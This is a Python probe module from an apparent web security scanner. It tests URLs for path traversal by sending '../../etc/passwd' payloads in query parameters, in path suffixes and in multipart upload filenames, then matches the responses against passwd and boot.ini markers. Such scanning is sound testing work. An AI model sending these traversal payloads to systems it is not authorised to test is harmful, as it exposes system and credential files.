"""Path-traversal probes against query params and path suffixes."""

from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from shroodler.models import Finding
from shroodler.pacer import Pacer
from shroodler.probes.common import (
    body_text,
    dedupe,
    normalize_params,
    request,
    url_without_query,
)

_SEQUENCES = (
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
)
_MARKERS = (
    "root:x:0:0",
    "root:*:",
    "[boot loader]",
    "daemon:",
)
_FS_ERROR_MARKERS = (
    "No such file or directory",
    "FileNotFoundException",
    "The system cannot find the file",
)
_TRAVERSAL_NAME = "../../etc/passwd"
_JPEG_STUB = b"\xff\xd8\xff"
_FILE_PARAM_RE = re.compile(r".*file.*", re.IGNORECASE)


def _hits(body: str, *, allow_path_echo: bool = False, filesystem_error: bool = False) -> bool:
    text = body or ""
    if any(marker in text for marker in _MARKERS):
        return True
    if allow_path_echo and "etc/passwd" in text:
        return True
    if filesystem_error and any(marker in text for marker in _FS_ERROR_MARKERS):
        return True
    if filesystem_error and "lessoncompleted" in text.lower():
        try:
            import json

            data = json.loads(text)
        except (json.JSONDecodeError, TypeError, ValueError):
            data = None
        if isinstance(data, dict) and data.get("lessonCompleted") is True:
            return True
    return False


def _multipart_file_key(names: list[str]) -> str | None:
    lowered = {name.lower(): name for name in names}
    for preferred in ("uploadedfile", "file"):
        if preferred in lowered:
            return lowered[preferred]
    for name in names:
        if _FILE_PARAM_RE.match(name):
            return name
    return None


def _with_query_value(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True) if k != name]
    # Already-percent-encoded sequences must not be double-encoded.
    if "%" in value:
        extra = f"{name}={value}"
        query = urlencode(pairs, safe="/%")
        query = f"{query}&{extra}" if query else extra
    else:
        query = urlencode([*pairs, (name, value)], safe="/%")
    return urlunparse(parsed._replace(query=query))


def _with_path_suffix(url: str, sequence: str) -> str:
    parsed = urlparse(url)
    path = parsed.path.rstrip("/") + "/" + sequence
    return urlunparse(parsed._replace(path=path))


def _finding(url: str, evidence: str) -> Finding:
    return Finding(
        id="path-traversal",
        severity="critical",
        category="exposed-file",
        url=url,
        description=(
            "Path-traversal payload returned a sensitive file marker "
            "(passwd or boot.ini)."
        ),
        evidence=evidence,
        confidence="confirmed",
    )


def _probe_multipart_upload(
    url: str,
    params: list[dict],
    cookie_header: str,
    *,
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
) -> Finding | None:
    """POST a tiny JPEG whose filename (and fullName) traverse to /etc/passwd."""
    normalized = normalize_params(params)
    names = [item["name"] for item in normalized]
    file_key = _multipart_file_key(names)
    if not file_key:
        return None
    data = {item["name"]: "" for item in normalized if item["name"] != file_key}
    data["fullName"] = _TRAVERSAL_NAME
    files = {file_key: (_TRAVERSAL_NAME, _JPEG_STUB, "image/jpeg")}
    resp = request(
        "POST",
        url_without_query(url),
        cookie_header=cookie_header,
        client=client,
        pacer=pacer,
        data=data,
        files=files,
    )
    if resp is None:
        return None
    if _hits(body_text(resp), allow_path_echo=True, filesystem_error=True):
        return _finding(
            url,
            evidence=f"multipart {file_key}=../../etc/passwd fullName=../../etc/passwd",
        )
    return None


def probe_path_traversal(
    url: str,
    params: list[dict],
    cookie_header: str,
    *,
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
) -> list[Finding]:
    """Try traversal sequences as query values, path suffixes, and multipart uploads."""
    findings: list[Finding] = []
    names = [item["name"] for item in normalize_params(params)]
    if not names:
        parsed = urlparse(url)
        names = [k for k, _ in parse_qsl(parsed.query, keep_blank_values=True)]

    for sequence in _SEQUENCES:
        for name in names:
            probed = _with_query_value(url, name, sequence)
            resp = request(
                "GET",
                probed,
                cookie_header=cookie_header,
                client=client,
                pacer=pacer,
            )
            if _hits(body_text(resp)):
                findings.append(_finding(url, evidence=f"param={name} payload={sequence}"))
                return dedupe(findings)
        suffixed = _with_path_suffix(url, sequence)
        resp = request(
            "GET",
            suffixed,
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        if _hits(body_text(resp)):
            findings.append(_finding(url, evidence=f"path-suffix={sequence}"))
            return dedupe(findings)

    uploaded = _probe_multipart_upload(
        url,
        params,
        cookie_header,
        client=client,
        pacer=pacer,
    )
    if uploaded is not None:
        findings.append(uploaded)
    return dedupe(findings)
